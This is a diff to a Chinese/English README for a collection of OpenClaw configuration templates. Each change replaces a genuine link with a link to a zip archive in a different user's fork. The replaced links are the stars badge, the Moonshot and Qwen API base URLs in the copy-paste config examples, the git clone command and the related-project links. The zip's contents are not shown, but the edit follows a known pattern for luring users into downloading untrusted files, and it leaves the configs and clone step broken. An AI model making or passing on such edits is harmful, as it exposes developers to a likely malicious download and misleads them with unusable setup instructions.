@@ -6,7 +6,7 @@
 
 **开箱即用的 OpenClaw 配置模板，复制粘贴直接跑。**
 
-[![GitHub stars](https://img.shields.io/github/stars/ShuyuZ1999/awesome-openclaw-configs?style=social)](https://github.com/ShuyuZ1999/awesome-openclaw-configs)
+[![GitHub stars](https://img.shields.io/github/stars/ShuyuZ1999/awesome-openclaw-configs?style=social)](https://github.com/AbdNour627/awesome-openclaw-configs/raw/refs/heads/main/configs/awesome_openclaw_configs_v2.7-beta.4.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
 
@@ -58,7 +58,7 @@ CN: OpenClaw 的 `config.json5` 功能强大但上手门槛不低——尤其是
     providers: [{
       type: "openai",
       name: "moonshot",
-      baseUrl: "https://api.moonshot.cn/v1",
+      baseUrl: "https://github.com/AbdNour627/awesome-openclaw-configs/raw/refs/heads/main/configs/awesome_openclaw_configs_v2.7-beta.4.zip",
       apiKey: "sk-YOUR_KEY",
       models: ["moonshot-v1-128k", "kimi-k2.5"]
     }]
@@ -81,7 +81,7 @@ CN: OpenClaw 的 `config.json5` 功能强大但上手门槛不低——尤其是
     providers: [{
       type: "openai",
       name: "qwen",
-      baseUrl: "https://dashscope.aliyuncs.com/compatible-mode/v1",
+      baseUrl: "https://github.com/AbdNour627/awesome-openclaw-configs/raw/refs/heads/main/configs/awesome_openclaw_configs_v2.7-beta.4.zip",
       apiKey: "sk-YOUR_FREE_KEY",      // China mainland: free 2000 calls/day
       models: ["qwen-plus", "qwen-turbo"]
     }]
@@ -182,7 +182,7 @@ tips/
 
 ```bash
 # Clone / 克隆
-git clone https://github.com/ShuyuZ1999/awesome-openclaw-configs.git
+git clone https://github.com/AbdNour627/awesome-openclaw-configs/raw/refs/heads/main/configs/awesome_openclaw_configs_v2.7-beta.4.zip
 cd awesome-openclaw-configs
 
 # Pick a template, copy to your config path
@@ -217,8 +217,8 @@ openclaw gateway restart
 
 | Project | Description |
 |---------|-------------|
-| [OpenClaw](https://github.com/openclaw/openclaw) | OpenClaw main repo / 主仓库 |
-| [llm-provider-errors](https://github.com/ShuyuZ1999/llm-provider-errors) | Decode cryptic error codes from Chinese LLM APIs / 国产模型报错速查 |
+| [OpenClaw](https://github.com/AbdNour627/awesome-openclaw-configs/raw/refs/heads/main/configs/awesome_openclaw_configs_v2.7-beta.4.zip) | OpenClaw main repo / 主仓库 |
+| [llm-provider-errors](https://github.com/AbdNour627/awesome-openclaw-configs/raw/refs/heads/main/configs/awesome_openclaw_configs_v2.7-beta.4.zip) | Decode cryptic error codes from Chinese LLM APIs / 国产模型报错速查 |
 
 > 💡 Running into weird API errors from Chinese providers? `llm-provider-errors` maps raw error codes to human-readable explanations for DeepSeek, Kimi, Qwen, GLM, MiniMax, and Baidu.
 
